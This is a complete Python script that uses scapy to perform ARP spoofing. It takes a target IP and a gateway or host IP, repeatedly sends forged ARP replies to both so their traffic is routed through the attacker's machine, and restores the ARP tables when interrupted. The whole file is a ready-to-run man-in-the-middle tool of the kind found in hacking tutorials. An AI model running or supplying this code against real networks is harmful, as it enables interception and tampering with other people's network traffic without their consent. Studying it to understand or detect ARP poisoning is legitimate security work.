#!/usr/bin/python3

import scapy.all as scapy
import argparse
import time


# The Argument function (takes arguments)
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Enter the targte IP")
    parser.add_argument("-s", "--spoof", dest="spoof",
                        help="Enter the IP that you want to spoofing")
    # parser.add_argument("-i", "--interface", dest="interface",
    #                     help="Enter you interface")
    args = parser.parse_args()
    if args.target and args.spoof:
        return args
    else:
        return parser.print_help()


# This function change ip address to mac address
def get_mac(ip):
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
    an = scapy.srp(packet, timeout=3, verbose=False)[0]
    mac = an[0][1].hwsrc
    return mac

# This function creates spoofing packets.
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# This function restores the arp table on target and router
def restor(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    spoofed_mac = get_mac(spoofed_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
    scapy.send(packet, verbose=False)


count = 0
options = get_args()
try:
    if options.target and options.spoof:
        target_ip = options.target
        spoof_ip = options.spoof
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            count += 2
            print(f"\r[+] packet sent: {count}", end="")
            time.sleep(2)
except AttributeError:
    pass
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + c ...... Quitting")
    restor(target_ip, spoof_ip)
    restor(spoof_ip, target_ip)
except:
    print("[-] somthing went wrong")
